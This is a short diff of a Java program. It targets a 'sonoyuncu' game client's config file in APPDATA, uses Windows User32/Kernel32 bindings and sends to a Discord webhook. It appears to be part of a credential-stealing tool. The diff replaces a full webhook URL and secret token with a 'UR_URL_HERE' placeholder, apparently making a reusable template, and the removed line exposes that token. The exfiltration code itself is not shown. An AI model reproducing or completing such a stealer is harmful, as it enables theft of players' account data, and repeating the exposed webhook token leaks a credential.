@@ -29,7 +29,7 @@ import org.apache.http.impl.client.HttpClients;
 public class Main {
     private static final String APPLICATION_PATH = System.getenv("APPDATA") + "/.sonoyuncu/sonoyuncuclient.exe";
     private static final String CONFIG_PATH = System.getenv("APPDATA") + "/.sonoyuncu/config.json";
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1380077883191590954/dfI-r3EJMWqqfAIpfcfT-l70OB0ftZY-Oi8bOnIVlRa7CoQT17J0_rvIUJ4A_nM_5iYc";
+    private static final String WEBHOOK_URL = "UR_URL_HERE";
 
     private User32 user32;
     private Kernel32 kernel32;
